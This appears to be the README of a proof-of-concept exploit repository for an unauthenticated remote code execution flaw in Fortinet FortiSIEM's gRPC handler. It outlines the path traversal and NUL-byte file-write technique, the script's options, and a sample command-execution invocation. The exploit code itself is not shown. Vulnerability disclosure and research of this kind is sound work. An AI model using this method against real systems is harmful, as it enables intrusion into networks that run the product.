# CVE-2026-106173: Fortinet FortiSIEM gRPC Path Traversal File Write RCE

This repository contains a proof of concept for CVE-2026-106173, an unauthenticated remote code execution vulnerability in Fortinet FortiSIEM.

## Vulnerability Details

The FortiSIEM gRPC `QueryResultReq` handler processes untrusted metadata without proper path validation. By crafting metadata containing both path traversal sequences (`../`) and NUL-byte injection within gRPC's HTTP/2 and HPACK encoding layers, an attacker can write arbitrary files to the filesystem.

## Usage

```
% python3 CVE-2026-106173.py -h
usage: CVE-2026-106173.py [-h] -t TARGET [-c COMMAND] [-p PORT] [--plaintext]
                          [--dry-run]

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        IP or hostname of the FortiSIEM instance
  -c COMMAND, --command COMMAND
                        Command to execute on the target
  -p PORT, --port PORT  FortiSIEM gRPC port (default: 27918)
  --plaintext           Use HTTP/2 without TLS
  --dry-run             Display the request without sending
```

Execute an arbitrary command:

```
python3 CVE-2026-106173.py -t 10.0.18.x -c 'id'
```

NOTE: Execution is blind, and takes up to 60 seconds for the cron job to trigger executing the script we overwrote.
